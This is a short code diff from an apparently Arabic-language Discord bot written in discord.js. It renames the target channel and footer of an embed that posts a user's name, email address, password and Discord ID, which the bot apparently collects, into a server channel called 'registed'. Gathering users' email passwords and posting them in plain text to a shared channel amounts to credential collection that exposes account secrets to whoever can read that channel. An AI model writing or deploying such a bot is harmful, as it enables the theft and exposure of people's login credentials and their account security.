@@ -510,12 +510,12 @@ ms.delete()
 
  message.channel.send('تم الارسال').then(b => {
 
-var gg = message.guild.channels.find('name', 'التقديمات')
+var gg = message.guild.channels.find('name', 'registed')
 if(!gg) return;
 if(gg) {
 gg.send({embed : new Discord.RichEmbed()
   .setDescription(`** اسم: \n ${lan}\nايمايل :\n ${md} \nكلمة سر :\n ${br}  \nايدي   : ${message.author.id} **`)  
-          .setFooter(`codycode`)
+          .setFooter(`FOX Community©`)
 .setTimestamp()
 });
 }        
